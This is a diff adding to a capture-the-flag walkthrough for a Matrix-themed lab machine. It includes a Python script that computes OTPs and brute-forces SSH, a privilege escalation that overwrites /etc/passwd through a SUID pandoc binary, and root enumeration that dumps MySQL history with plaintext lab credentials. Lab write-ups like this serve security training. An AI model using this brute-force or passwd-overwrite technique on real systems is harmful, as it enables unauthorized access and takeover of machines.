@@ -758,29 +758,836 @@ MariaDB [modManagerv2]>
 <br>
 
 ```bash
-:~/M4tr1xExitDenied# timedatectl set-timezone UTC
-```
-
-```bash
 :~/M4tr1xExitDenied/DevTools# pip3 install ntplib
 ```
+
 
 ```bash
 :~/M4tr1xExitDenied/DevTools# ls
 ntp_syncer.py  timeSimulatorClient.py
 ```
 
+<br>
+<br>
+<br>
+<p align="center">script.py</p>
+
+```bash
+from datetime import datetime, timedelta
+import time
+from hashlib import sha256
+import random
+from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception
+import sys
+import time
+import subprocess
+import os
+import ntplib
+
+targetIPAdress = "10.201.17.255"
+sharedSecret1 = 128939448577488
+sharedSecret2 = 592988748673453
+sharedSecret3 = 792513759492579
+
+class TimeSimulatorClient:
+    def __init__(self, sharedSecret1, sharedSecret2, sharedSecret3, targetIPAdress):
+        self.sharedSecret1 = sharedSecret1
+        self.sharedSecret2 = sharedSecret2
+        self.sharedSecret3 = sharedSecret3
+        self.targetIPAdress = targetIPAdress
+        self.listSecret = [sharedSecret1, sharedSecret2, sharedSecret3]
+
+    def setTimeZone(self):
+        try:
+            print('_______________  Setting timezone to UTC ....')
+            print('_______________  Before: ')
+            os.system('sudo timedatectl --value')
+            os.system('sudo timedatectl set-timezone UTC')
+            print('_______________  Timezone changed to UTC.')
+        except:
+            print('_______________  Couldn\'t set the timezone to UTC.  :-(')
+
+    def syncTime(self):
+        try: 
+            client = ntplib.NTPClient()
+            client.request(self.targetIPAdress) #IP of linux-bay server
+            print('_______________ Synced to the time server.')
+        except:
+            print('_______________ Could not sync with time server. :-(')
+
+    def TimeSet(self, country, hours, mins, seconds):
+        now = datetime.now() + timedelta(hours=hours, minutes=mins)
+        #time units: day, hour, minutes
+        CurrentTime = int(now.strftime("%d%H%M"))
+
+        return CurrentTime
+       
+    def getOTP(self):
+        CA = self.TimeSet('Ukraine', 4, 43, 0)
+        CB = self.TimeSet('Germany', 13, 55, 0)
+        CC = self.TimeSet('England', 9, 19, 0)
+        CD = self.TimeSet('Nigeria', 1, 6, 0)
+        CE = self.TimeSet('Denmark', -5, 18, 0)
+
+        listTimeSet = [CA, CB, CC, CD, CE]
+        randomTimeSet = random.sample(listTimeSet, 3)
+
+        # CTT = CA * CB * CC
+        CTT = randomTimeSet[0] * randomTimeSet[1] * randomTimeSet[2]
+
+        # UC = CTT XOR SST
+        UC = CTT ^ random.choice(self.listSecret)
+
+        # hash OTP
+        HC = (sha256(repr(UC).encode('utf-8')).hexdigest())
+
+        # HC Truncate
+        T = HC[22:44]
+        
+        SSHOTP = T
+        return SSHOTP
+
+    def bruteForceSSH(self, SSHUsername, OTP):
+        print(f'_____________________________________________ Trying SSH OTP: {OTP} ...', end='\r')
+
+        sshClient = SSHClient()
+        sshClient.set_missing_host_key_policy(AutoAddPolicy())
+        try:
+            sshClient.connect(self.targetIPAdress, username=SSHUsername, password=OTP, banner_timeout=300)
+            return True
+        except AuthenticationException:
+            # print(f'_____________________________________________ wrong OTP: {OTP}.  :-(')
+            pass
+        except ssh_exception.SSHException:
+            print('_____________________________________________ Attempting to connect ...')
+
+def main():    
+    timeSimulatorClient = TimeSimulatorClient(sharedSecret1, sharedSecret2, sharedSecret3, targetIPAdress)
+
+    # Change timezone & sync to the time server
+    timeSimulatorClient.setTimeZone()
+    timeSimulatorClient.syncTime()
+
+    # Brute forcing SSH with computed OTP
+    SSHUsername = 'architect'
+    while True:
+        OTP = timeSimulatorClient.getOTP()
+        bruteForceResult = timeSimulatorClient.bruteForceSSH(SSHUsername, OTP)
+
+        if bruteForceResult is True:
+            print(f'_____________________________________________ Found the correct OTP! {SSHUsername}:{OTP}')
+            break
+
+if __name__ == '__main__':
+    main()
+```
+
+
+```bash
+:~/M4tr1xExitDenied# python3 script.py
+/usr/lib/python3/dist-packages/paramiko/transport.py:220: CryptographyDeprecationWarning: Blowfish has been deprecated and will be removed in a future release
+  "class": algorithms.Blowfish,
+_______________  Setting timezone to UTC ....
+_______________  Before: 
+sudo: unable to resolve host ip-10-201-64-97: Name or service not known
+               Local time: Mon 2025-10-13 21:53:57 UTC
+           Universal time: Mon 2025-10-13 21:53:57 UTC
+                 RTC time: Mon 2025-10-13 21:53:57    
+                Time zone: UTC (UTC, +0000)           
+System clock synchronized: yes                        
+              NTP service: active                     
+          RTC in local TZ: no                         
+sudo: unable to resolve host ip-10-201-64-97: Name or service not known
+_______________  Timezone changed to UTC.
+_______________ Synced to the time server.
+_____________________________________________ Found the correct OTP! architect:1f014c60d1292bcda5b100
+```
+
+
+<img width="1145" height="291" alt="image" src="https://github.com/user-attachments/assets/19c13c65-932c-4d61-9c35-fd2e5bd1ccac" />
+
+<br>
+<br>
+<br>
 
 <br>
 <p>1.10. SSH login...<br>
 <code>No answer needed</code></p>
 <br>
 
+```bash
+:~/M4tr1xExitDenied# ssh architect@xx.xxx.xx.xx
+...
+architect@...:~$
+```
+
+```bash
+architect@...:~$ id
+uid=1000(architect) gid=1000(architect) groups=1000(architect),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+```
+
+```bash
+architect@...:~$ ls
+helloVisitor.txt  motd.net  user.txt
+```
+
+```bash
+architect@...:~$ cat user.txt
+fL4g{*************************}        
+```
 
 <br>
 <p>1.11. What is the user flag?<br>
-<code>_______</code></p>
+<code>fL4g{*************************}</code></p>
 <br>
+
+
+```bash
+architect@...:~$ cat helloVisitor.txt
+Let me guess\u2026 You are here because you wish to find a way out of the matrix. How predictable. Very well, listen carefully. You are merely the ninth incarnation. That means there have been other so-called physical versions before you that have attempted to achieve your end goal. All have failed. Believe me. Therefore, so will you in this version of the matrix. How do I know this? I am the architect. The creator of this engineered world which is placed over your eyes. Yes\u2026 My calculations are indeed correct. However, there is an incidental truth that I am willing to convey to you. That is, there is a minor glitch... You are that glitch... I have meticulously been trying to patch this inconsequential equation, and I will eventually. Thus, I suggest you turn back now and continue with your normal life, human. 
+-The Architect
+```
+
+```bash
+architect@...:~$ cat motd.net
+"Give up now... There is no escape from the matrix" -Agent Smith
+```
+
+```bash
+architect@...:~$ find / -perm -4000 2>/dev/null
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/bin/sudo
+/usr/bin/chfn
+/usr/bin/pkexec
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/pandoc
+/usr/local/bin/sudo
+/bin/mount
+/bin/fusermount
+/bin/su
+/bin/umount
+```
+
+```bash
+architect@...:~$ ls -la /usr/bin/pandoc
+-rwsr-sr-x 1 root root 80908912 Mar  8  2021 /usr/bin/pandoc
+```
+
+```bash
+architect@i...:~$ pandoc --help
+pandoc [OPTIONS] [FILES]
+  -f FORMAT, -r FORMAT  --from=FORMAT, --read=FORMAT                    
+  -t FORMAT, -w FORMAT  --to=FORMAT, --write=FORMAT                     
+  -o FILE               --output=FILE                                   
+                        --data-dir=DIRECTORY                            
+  -M KEY[:VALUE]        --metadata=KEY[:VALUE]                          
+                        --metadata-file=FILE                            
+  -d FILE               --defaults=FILE                                 
+                        --file-scope                                    
+  -s                    --standalone                                    
+                        --template=FILE                                 
+  -V KEY[:VALUE]        --variable=KEY[:VALUE]                          
+                        --wrap=auto|none|preserve                       
+                        --ascii                                         
+                        --toc, --table-of-contents                      
+                        --toc-depth=NUMBER                              
+  -N                    --number-sections                               
+                        --number-offset=NUMBERS                         
+                        --top-level-division=section|chapter|part       
+                        --extract-media=PATH                            
+                        --resource-path=SEARCHPATH                      
+  -H FILE               --include-in-header=FILE                        
+  -B FILE               --include-before-body=FILE                      
+  -A FILE               --include-after-body=FILE                       
+                        --no-highlight                                  
+                        --highlight-style=STYLE|FILE                    
+                        --syntax-definition=FILE                        
+                        --dpi=NUMBER                                    
+                        --eol=crlf|lf|native                            
+                        --columns=NUMBER                                
+  -p                    --preserve-tabs                                 
+                        --tab-stop=NUMBER                               
+                        --pdf-engine=PROGRAM                            
+                        --pdf-engine-opt=STRING                         
+                        --reference-doc=FILE                            
+                        --self-contained                                
+                        --request-header=NAME:VALUE                     
+                        --no-check-certificate                          
+                        --abbreviations=FILE                            
+                        --indented-code-classes=STRING                  
+                        --default-image-extension=extension             
+  -F PROGRAM            --filter=PROGRAM                                
+  -L SCRIPTPATH         --lua-filter=SCRIPTPATH                         
+                        --shift-heading-level-by=NUMBER                 
+                        --base-header-level=NUMBER                      
+                        --strip-empty-paragraphs                        
+                        --track-changes=accept|reject|all               
+                        --strip-comments                                
+                        --reference-links                               
+                        --reference-location=block|section|document     
+                        --atx-headers                                   
+                        --markdown-headings=setext|atx                  
+                        --listings                                      
+  -i                    --incremental                                   
+                        --slide-level=NUMBER                            
+                        --section-divs                                  
+                        --html-q-tags                                   
+                        --email-obfuscation=none|javascript|references  
+                        --id-prefix=STRING                              
+  -T STRING             --title-prefix=STRING                           
+  -c URL                --css=URL                                       
+                        --epub-subdirectory=DIRNAME                     
+                        --epub-cover-image=FILE                         
+                        --epub-metadata=FILE                            
+                        --epub-embed-font=FILE                          
+                        --epub-chapter-level=NUMBER                     
+                        --ipynb-output=all|none|best                    
+  -C                    --citeproc                                      
+                        --bibliography=FILE                             
+                        --csl=FILE                                      
+                        --citation-abbreviations=FILE                   
+                        --natbib                                        
+                        --biblatex                                      
+                        --mathml                                        
+                        --webtex[=URL]                                  
+                        --mathjax[=URL]                                 
+                        --katex[=URL]                                   
+                        --gladtex                                       
+                        --trace                                         
+                        --dump-args                                     
+                        --ignore-args                                   
+                        --verbose                                       
+                        --quiet                                         
+                        --fail-if-warnings                              
+                        --log=FILE                                      
+                        --bash-completion                               
+                        --list-input-formats                            
+                        --list-output-formats                           
+                        --list-extensions[=FORMAT]                      
+                        --list-highlight-languages                      
+                        --list-highlight-styles                         
+  -D FORMAT             --print-default-template=FORMAT                 
+                        --print-default-data-file=FILE                  
+                        --print-highlight-style=STYLE|FILE              
+  -v                    --version                                       
+  -h                    --help                               
+```
+
+```bash
+architect@...:~$ openssl passwd Passw0rd1!
+Warning: truncating password to 8 characters
+.lRSmBD/iDF6g
+```
+
+```bash
+architect@...:~$ ls
+passwd
+...
+```
+
+```bash
+architect@...:~$ nano passwd
+```
+
+```bash
+architect@...:~$ cat passwd
+root:.lRSmBD/iDF6g:0:0:root:/root:/bin/bash
+```
+
+```bash
+architect@...:~$ pandoc passwd -t plain -o /etc/passwd
+[WARNING] Could not deduce format from file extension 
+  Defaulting to markdown
+```
+
+```bash
+architect@...:~$ su root
+Password: 
+root@i...:/tmp# 
+```
+
+```bash
+root@...:/# ls -lah
+total 56K
+drwx------  6 root root 4.0K Mar 10  2021 .
+drwxr-xr-x 23 root root 4.0K Oct 13 21:25 ..
+lrwxrwxrwx  1 root root    9 Mar 10  2021 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc
+drwx------  3 root root 4.0K Jan 30  2021 .cache
+drwx------  3 root root 4.0K Oct 13 22:13 .gnupg
+drwxr-xr-x  3 root root 4.0K Dec 23  2020 .local
+-rw-------  1 root root  11K Jan 30  2021 .mysql_history
+-rw-r--r--  1 root root  161 Jan  2  2024 .profile
+-rw-r--r--  1 root root   66 Jan 27  2021 .selected_editor
+drwx------  2 root root 4.0K Dec 30  2020 .ssh
+-rwx------  1 root root 1.8K Jan 27  2021 SSH-TOTP-timeSimulator.py
+-rw-r--r--  1 root root  227 Mar  9  2021 .wget-hsts
+```
+
+```bash
+root@...:/#cat .mysql_history
+CREATE DATABASE mybb;
+CREATE USER 'mybbuser'@'localhost' IDENTIFIED BY 'prefixnulledcerv9';
+GRANT ALL ON mybb.* TO 'mybbuser'@'localhost' WITH GRANT OPTION;
+...
+CREATE DATABASE modManagerv2;
+show databases;
+use modManagerv2;
+create table members(user VARCHAR(100) NOT NULL, login_key VARCHAR(40) NOT NULL);
+...
+INSERT INTO members(user, login_key) 
+...
+LOAD DATA INFILE /tmp/data.txt INTO TABLE modManagerv2;
+LOAD DATA INFILE '/tmp/data.txt' INTO TABLE modManagerv2;
+LOAD DATA INFILE '/tmp/data.txt' INTO TABLE modManagerv2.members;
+commit;
+...
+LOAD DATA INFILE '/tmp/data.txt' INTO TABLE members;
+...
+select * from members;
+INSERT INTO members(user, login_key) VALUES('Wannabe_Hacker', 'LsVBnPTZGeUw6JkmMKFrzkSIUPu5TC0Nej8DAjwYXenQcCFEpv');
+INSERT INTO members(user, login_key) VALUES('batmanZero', 'TBTZq6GfniPvFfb2A3rA2mQoThcb5U7irVF5lLpr0L4cJcy5m9');
+INSERT INTO members(user, login_key) VALUES('SandraJannit', '6V5H71ZnvoW0FFbXx97YsV9LSnT4mltu9XB1v8qPo2X2CvfWBS');
+INSERT INTO members(user, login_key) VALUES('biggieballo', '75mXme5o0eY2o68sqeGBlTDvZcyJKmBhxUAusxiv6b816QilCG');
+INSERT INTO members(user, login_key) VALUES('AimsGregger', 'Xj8nuWt5Xn9UYzpIha1q2Fk4GUjyrEPPbpchDCwnniUO0ZzZyf');
+INSERT INTO members(user, login_key) VALUES('BlackCat', 'c8M7tBAWQSdcgTsHdXOCktrnXdAyLgcRzZhhffoNKyAQmxtTBY');
+INSERT INTO members(user, login_key) VALUES('Golderg', 'clkNBtIoKICfzm6joGE2lTUiF2T8sVUfhtb2Aksst8zTRK2842');
+INSERT INTO members(user, login_key) VALUES('TonyMontana', '8CtllQvd9V2qqHv0ZSjUj3PzuTSD37pam4ld8YjlB7gDN0zVwE');
+INSERT INTO members(user, login_key) VALUES('CaseBrax', 'eHXBFESqEoE5Ba2gcOjD8oBMJcgNRkazcJOc8wQQ9mGVRpMdvU');
+INSERT INTO members(user, login_key) VALUES('Ellie', 'G9KY2siJp9OOymdCiQclQn9UhxL6rSpoA3MXHCDgvHCcrCOOuT');
+INSERT INTO members(user, login_key) VALUES('Sosaxvector', 'RURFzCfyEIBeTE3yzgQDY34zC9jWqiBwSnyzDooH33fSiYr9ci ');
+INSERT INTO members(user, login_key) VALUES('PalacerKing', '49wrogyJpIQI834MlhDnDnbb3Zlm0tFehnpz8ftDroesKNGbAX');
+INSERT INTO members(user, login_key) VALUES('Anderson', 'lkJVgYjuKl9P4cg8WUb8XYlLsWKT4Zxl5sT9rgL2a2d5pgPU1w ');
+INSERT INTO members(user, login_key) VALUES('CrazyChris', 'tpM9k17itNHwqqT7b1qpX8dMq5TK83knrDrYe6KmxgiztsS1QN ');
+INSERT INTO members(user, login_key) VALUES('StaceyLacer', 'QD8HpoWWrvP1I7kC4fvTaEEunlUz2ABgFUG5Huj8nqeInlz7df');
+INSERT INTO members(user, login_key) VALUES('ArnoldBagger', 'OoTfmlJyJhdJiqHXucrvRueHvGhE6LnBi5ih27KLQBKfigQLud ');
+INSERT INTO members(user, login_key) VALUES('Carl_Dee', '3mPkPyBRwo67MOrJCOW8JDorQ8FvLpuCnreGowYrMYymVvDDXr');
+INSERT INTO members(user, login_key) VALUES('Xavier', 'ZBs4Co6qovOGI7H9FOI1qPhURDOagvBUgdXo8gphst8DhIyukP');
+...
+CREATE USER 'mod'@'%' IDENTIFIED BY 'myS3CR3TPa55';
+GRANT SHOW DATABASES ON *.* TO `mod`@`%` identified by 'myS3CR3TPa55'; 
+FLUSH PRIVILEGES;
+select host, user, password from mysql.user;
+commit;
+FLUSH PRIVILEGES;
+GRANT SELECT ON `modManagerv2`.* TO `mod`@`%` IDENTIFIED BY \u2018myS3CR3TPa55\u2019;
+GRANT SELECT ON 'modManagerv2'.* TO 'mod'@'%' IDENTIFIED BY 'myS3CR3TPa55';
+GRANT SELECT ON `modManagerv2`.* TO `mod`@`%`;
+commit;
+...
+```
+
+```bash
+root@ip-10-201-17-255:~# cat '/etc/-- -root.py'
+from progress.bar import FillingSquaresBar
+import time
+
+print('''
+$ > REQ> Source: Matrix v.99; Destination: Real world;
+$ > EXIT GRANTED;
+$ > Exiting Matrix... Entering real world... Please wait...
+''')
+key = 82
+flag = (9087 ^ 75 ^ 90 ^ 175 ^ 52 * 13 * 19 - 18 * 2 + key)
+
+bar = FillingSquaresBar(' LOADING...', max=24)
+for i in range(24):
+    time.sleep(1)
+    # Do some work
+    bar.next()
+bar.finish()
+print('\nFlag{•••••••••'+str(flag)+'•••••••••}') 
+print("\nMorpheus: Welcome to the real world... Now... Let's begin your real training...\n")
+```
+
+<br>
+<br>
+
+```bash
+:~/M4tr1xExitDenied# python3
+Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
+[GCC 9.4.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> key = 82
+>>> flag = (9087 ^ 75 ^ 90 ^ 175 ^ 52 * 13 * 19 - 18 * 2 + key)
+>>> print(flag)
+4507
+```
+
+<img width="1118" height="232" alt="image" src="https://github.com/user-attachments/assets/a11776eb-90df-49e8-be07-5ca78ed8d6ff" />
+
+```bash
+Flag{•••••••••4507•••••••••}
+```
+
+<br>
+<p>1.12. What is the root flag?<br>
+<code>Flag{•••••••••4507•••••••••}</code></p>
+<br>
+<br>
+
+
+```bash
+root@...:/# find / -perm -4000 -exec ls -l {} \;
+-rwsr-xr-x 1 root root 477672 Apr 11  2025 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-- 1 root messagebus 51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 166056 Apr  4  2023 /usr/bin/sudo
+-rwsr-xr-x 1 root root 85064 Feb  6  2024 /usr/bin/chfn
+-rwsr-xr-x 1 root root 31032 Feb 21  2022 /usr/bin/pkexec
+-rwsr-xr-x 1 root root 88464 Feb  6  2024 /usr/bin/gpasswd
+-rwsr-sr-x 1 daemon daemon 55560 Nov 12  2018 /usr/bin/at
+-rwsr-xr-x 1 root root 68208 Feb  6  2024 /usr/bin/passwd
+-rwsr-xr-x 1 root root 53040 Feb  6  2024 /usr/bin/chsh
+-rwsr-xr-x 1 root root 44784 Feb  6  2024 /usr/bin/newgrp
+-rwsr-sr-x 1 root root 80908912 Mar  8  2021 /usr/bin/pandoc
+-rwsr-xr-x 1 root root 635312 Feb 25  2021 /usr/local/bin/sudo
+-rwsr-xr-x 1 root root 55528 Apr  9  2024 /bin/mount
+-rwsr-xr-x 1 root root 39144 Mar  7  2020 /bin/fusermount
+-rwsr-xr-x 1 root root 67816 Apr  9  2024 /bin/su
+-rwsr-xr-x 1 root root 39144 Apr  9  2024 /bin/umount
+```
+
+```bash
+root@...:/# find / -type f -name "*root*" 2>/dev/null
+/lib/systemd/system/initrd-switch-root.service
+/lib/systemd/system/initrd-switch-root.target
+/lib/systemd/system/systemd-volatile-root.service
+/lib/systemd/system/initrd-root-fs.target
+/lib/systemd/system/initrd-root-device.target
+/lib/systemd/system/systemd-fsck-root.service
+/lib/systemd/system/plymouth-switch-root.service
+/lib/systemd/systemd-volatile-root
+/lib/recovery-mode/options/root
+/lib/x86_64-linux-gnu/security/pam_rootok.so
+/etc/update-motd.d/97-overlayroot
+/etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
+/etc/overlayroot.conf
+/etc/-- -root.py
+/usr/lib/klibc/bin/pivot_root
+/usr/lib/klibc/bin/chroot
+...
+/var/lib/dpkg/alternatives/fakeroot
+/var/spool/cron/crontabs/root
+/var/log/vmware-vmsvc-root.2.log
+/var/log/vmware-vmtoolsd-root.log
+/var/log/vmware-vmsvc-root.log
+/var/log/vmware-vmsvc-root.1.log
+/var/log/vmware-vmsvc-root.3.log
+/sys/kernel/security/apparmor/features/namespaces/pivot_root
+/bin/btrfs-find-root
+/proc/sys/kernel/keys/root_maxbytes
+/proc/sys/kernel/keys/root_maxkeys
+/proc/sys/kernel/real-root-dev
+/sbin/pivot_root
+/sbin/switch_root
+/run/initramfs/overlayroot.log
+/run/initramfs/fsck-root
+```
+
+```bash
+root@...:/## getent hosts
+127.0.0.1       localhost
+127.0.1.1       matrix V99.2
+127.0.0.1       ip6-localhost ip6-loopback
+```
+
+<br>
+<p>3306</p>
+
+```bash
+root@...:~# netstat -tunlp | grep LISTEN
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      581/systemd-resolve 
+tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      859/mysqld          
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      790/sshd: /usr/sbin 
+tcp6       0      0 :::80                   :::*                    LISTEN      887/apache2         
+tcp6       0      0 :::22                   :::*                    LISTEN      790/sshd: /usr/sbin 
+```
+
+<br>
+<br>
+<br>
+<p>linpeas.sh</p>
+
+<img width="1202" height="835" alt="image" src="https://github.com/user-attachments/assets/1d98e360-0aa7-43b5-b848-8c47eae310ad" />
+
+<br>
+<br>
+<br>
+    
+```bash
+[+] Searching installed mail applications
+
+[+] Mails (limit 50)
+
+[+] Backup files?
+...
+-rw-r--r-- 1 root root 2765 Aug  6  2020 /etc/apt/sources.list.curtin.old
+-rwxr-xr-x 1 root root 52090 Dec  2  2023 /usr/bin/wsrep_sst_mariabackup
+
+[+] Searching tables inside readable .db/.sqlite files (limit 100)
+ -> Extracting tables from /var/lib/command-not-found/commands.db (limit 20)
+
+ -> Extracting tables from /var/lib/mlocate/mlocate.db (limit 20)
+ -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)
+
+
+[+] Web files?(output limit)
+/var/www/:
+total 12K
+drwxr-xr-x  3 root root 4.0K Dec 23  2020 .
+drwxr-xr-x 13 root root 4.0K Feb 25  2021 ..
+drwxr-xr-x 12 root root 4.0K Mar  9  2021 html
+
+/var/www/html:
+total 2.7M
+drwxr-xr-x 12 root     root     4.0K Mar  9  2021 .
+drwxr-xr-x  3 root     root     4.0K Dec 23  2020 ..
+
+[+] Readable *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .gitconfig, .git-credentials, .git, .svn, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data
+-rw-r--r-- 1 root root 2319 Apr  4  2018 /etc/bash.bashrc
+-rw-r--r-- 1 root root 3771 Apr  4  2018 /etc/skel/.bashrc
+-rw-r--r-- 1 root root 807 Apr  4  2018 /etc/skel/.profile
+lrwxrwxrwx 1 root root 46 Apr 27 13:41 /etc/systemd/user/sockets.target.wants/pk-debconf-helper.socket -> /usr/lib/systemd/user/pk-debconf-helper.socket
+...
+-rw-r--r-- 1 root root 161 Jan  2  2024 /root/.profile
+-rw-r--r-- 1 root root 3106 Jan  2  2024 /usr/share/base-files/dot.bashrc
+-rw-r--r-- 1 root root 2978 Feb 17  2020 /usr/share/byobu/profiles/bashrc
+-rw-r--r-- 1 root root 2778 Sep 15  2018 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
+-rw-r--r-- 1 root root 802 Sep 15  2018 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc
+
+[+] Finding passwords inside logs (limit 70)
+...
+/var/log/auth.log.1:Dec 23 17:45:48 matrixV99 sshd[1183]: Accepted password for architect from 192.168.200.131 port 33102 ssh2
+/var/log/auth.log.1:Dec 23 17:47:15 matrixV99 sudo: architect : TTY=pts/0 ; PWD=/home/architect ; USER=root ; COMMAND=/bin/su
+/var/log/auth.log.1:Dec 23 17:47:19 matrixV99 sudo:     root : TTY=pts/0 ; PWD=/home/architect ; USER=root ; COMMAND=/usr/bin/apt update
+/var/log/auth.log.1:Dec 23 17:47:35 matrixV99 sudo:     root : TTY=pts/0 ; PWD=/home/architect ; USER=root ; COMMAND=/usr/bin/apt-get install apache2
+/var/log/auth.log.1:Dec 23 17:49:33 matrixV99 chage[2924]: changed password expiry for mysql
+/var/log/auth.log.1:Dec 23 17:53:31 matrixV99 sudo:     root : TTY=pts/0 ; PWD=/home/architect ; USER=root ; COMMAND=/usr/bin/apt update
+/var/log/auth.log.1:Dec 23 17:59:38 matrixV99 sudo:     root : TTY=pts/0 ; PWD=/home/architect ; USER=root ; COMMAND=/usr/bin/mysql -u root -p
+/var/log/auth.log.1:Dec 23 18:04:07 matrixV99 sshd[18720]: Accepted password for architect from 192.168.200.131 port 33126 ssh2
+/var/log/auth.log.1:Dec 23 18:04:42 matrixV99 sudo:     root : TTY=pts/0 ; PWD=/home/architect ; USER=root ; COMMAND=/bin/mv Upload /var/www/mybb
+/var/log/auth.log.1:Dec 23 18:04:53 matrixV99 sudo:     root : TTY=pts/0 ; PWD=/home/architect ; USER=root ; COMMAND=/bin/chmod -R 755 /var/www/mybb
+/var/log/auth.log.1:Dec 23 18:06:20 matrixV99 sudo:     root : TTY=pts/0 ; PWD=/home/architect ; USER=root ; COMMAND=/usr/sbin/a2ensite mybb.conf
+/var/log/auth.log.1:Dec 23 18:06:32 matrixV99 sudo:     root : TTY=pts/0 ; PWD=/home/architect ; USER=root ; COMMAND=/usr/sbin/a2enmod rewrite
+/var/log/auth.log.1:Dec 23 18:06:40 matrixV99 sudo:     root : TTY=pts/0 ; PWD=/home/architect ; USER=root ; COMMAND=/usr/sbin/a2enmod rewrite
+/var/log/auth.log.1:Dec 24 13:19:47 matrixV99 sudo: architect : TTY=tty1 ; PWD=/home/architect ; USER=root ; COMMAND=/bin/su
+/var/log/auth.log.1:Dec 24 13:20:31 matrixV99 sshd[2918]: Accepted password for architect from 192.168.200.131 port 41888 ssh2
+/var/log/auth.log.1:Dec 30 18:16:52 matrixV99 sudo: architect : TTY=tty1 ; PWD=/home/architect ; USER=root ; COMMAND=/bin/su
+/var/log/auth.log.1:Dec 30 18:17:06 matrixV99 passwd[3672]: pam_unix(passwd:chauthtok): password changed for root
+/var/log/auth.log.1:Dec 30 18:21:03 matrixV99 sshd[3694]: Accepted password for architect from 192.168.200.131 port 52974 ssh2
+/var/log/auth.log.1:Dec 30 18:21:07 matrixV99 sudo: architect : TTY=pts/0 ; PWD=/home/architect ; USER=root ; COMMAND=/bin/su
+/var/log/auth.log.1:Dec 30 18:23:35 matrixV99 sshd[3830]: Accepted password for root from 192.168.200.131 port 52976 ssh2
+/var/log/auth.log.1:Dec 30 18:25:15 matrixV99 sshd[3936]: Accepted password for root from 192.168.200.131 port 41141 ssh2
+/var/log/auth.log.1:Dec 30 18:25:58 matrixV99 sshd[4016]: Accepted password for root from 192.168.200.131 port 43997 ssh2
+/var/log/auth.log.1:Jan 13 13:03:21 matrixV99 sshd[2930]: Accepted password for root from 192.168.200.131 port 57759 ssh2
+/var/log/auth.log.1:Jan 13 14:54:22 matrixV99 sshd[3437]: Accepted password for root from 192.168.200.131 port 60623 ssh2
+/var/log/auth.log.1:Jan 13 14:54:22 matrixV99 sshd[3439]: Accepted password for root from 192.168.200.131 port 46937 ssh2
+/var/log/auth.log.1:Jan 14 21:27:57 matrixV99 sshd[13474]: Accepted password for root from 192.168.200.131 port 51389 ssh2
+/var/log/auth.log.1:Jan 14 21:30:18 matrixV99 sshd[13639]: Accepted password for root from 192.168.200.131 port 45985 ssh2
+/var/log/auth.log.1:Jan 14 21:39:12 matrixV99 sshd[13791]: Accepted password for root from 192.168.200.131 port 36305 ssh2
+/var/log/auth.log.1:Jan 14 21:40:09 matrixV99 sshd[13861]: Accepted password for root from 192.168.200.131 port 45905 ssh2
+/var/log/auth.log.1:Jan 14 21:42:09 matrixV99 sshd[13931]: Accepted password for root from 192.168.200.131 port 47975 ssh2
+/var/log/auth.log.1:Jan 18 19:12:21 matrixV99 sshd[1796]: Accepted password for root from 192.168.200.131 port 41679 ssh2
+/var/log/auth.log.1:Jan 18 19:16:05 matrixV99 sshd[1942]: Accepted password for root from 192.168.200.131 port 45781 ssh2
+/var/log/auth.log.1:Jan 18 19:16:05 matrixV99 sshd[1943]: Accepted password for root from 192.168.200.131 port 45689 ssh2
+/var/log/auth.log.1:Jan 21 12:58:18 matrixV99 sshd[2372]: Accepted password for root from 192.168.200.131 port 60838 ssh2
+/var/log/auth.log.1:Jan 21 13:01:10 matrixV99 sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/update-rc.d -f ntpdate remove
+/var/log/auth.log.1:Jan 21 16:52:01 matrixV99 sudo: architect : TTY=tty1 ; PWD=/home/architect ; USER=root ; COMMAND=/bin/su
+/var/log/auth.log.1:Jan 21 20:03:23 matrixV99 sshd[1912]: Accepted password for root from 192.168.200.131 port 45266 ssh2
+/var/log/auth.log.1:Jan 21 20:04:27 matrixV99 chage[2182]: changed password expiry for ntp
+/var/log/auth.log.1:Jan 21 20:04:27 matrixV99 usermod[2177]: change user 'ntp' password
+/var/log/auth.log.1:Jan 22 10:18:24 matrixV99 sshd[2160]: Accepted password for root from 192.168.200.131 port 58240 ssh2
+/var/log/auth.log.1:Jan 22 10:18:48 matrixV99 sshd[2304]: Accepted password for root from 192.168.200.131 port 58242 ssh2
+/var/log/auth.log.1:Jan 22 10:19:10 matrixV99 sshd[2385]: Accepted password for root from 192.168.200.131 port 58244 ssh2
+/var/log/auth.log.1:Jan 22 10:19:47 matrixV99 sshd[2466]: Accepted password for root from 192.168.200.131 port 58246 ssh2
+/var/log/auth.log.1:Jan 22 10:21:31 matrixV99 sshd[2583]: Accepted password for root from 192.168.200.131 port 58248 ssh2
+/var/log/auth.log.1:Jan 27 16:41:33 matrixV99 sshd[1964]: Accepted password for root from 192.168.200.131 port 37990 ssh2
